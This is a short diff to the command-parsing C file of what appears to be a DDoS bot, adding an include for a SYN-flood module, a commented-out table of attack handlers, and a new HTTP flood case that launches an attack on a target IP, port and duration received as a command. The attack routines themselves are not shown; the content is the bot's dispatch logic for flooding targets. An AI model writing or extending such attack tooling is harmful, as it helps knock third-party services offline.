@@ -1,14 +1,25 @@
 #include <stdio.h>
+#include <math.h>
 #include <stdlib.h>
 #include <string.h>
-#include <math.h>
 #include <stdint.h>
 #include <unistd.h>
 #include <signal.h>
 
 #include <command.h>
 #include <utils.h>
-#include <synflood.h> // TCP
+#include <synflood.h>
+
+#define COMMANDS_NUM 6
+
+/* struct attack_t {
+    uint8_t type;
+    void (*execute)(char *target_ip, int target_port, int duration);
+};
+
+attack_t attacks[COMMANDS_NUM] = {
+    {ATTACK_TCP, atk_start_tcp_essyn}
+}; */
 
 #ifdef DEBUG
 
@@ -93,6 +104,12 @@ static void parse_command(struct command *cmd)
                             cmd->data.port, cmd->data.duration);
         break;
     case ATTACK_UDP:
+        break;
+    case ATTACK_HTTP:
+        start_httplankton_attack(ip_to_string(cmd->data.target.o1,
+                                         cmd->data.target.o2,
+                                         cmd->data.target.o3,
+                                         cmd->data.target.o4), cmd->data.port, cmd->data.duration);
         break;
     case PING:
         break;
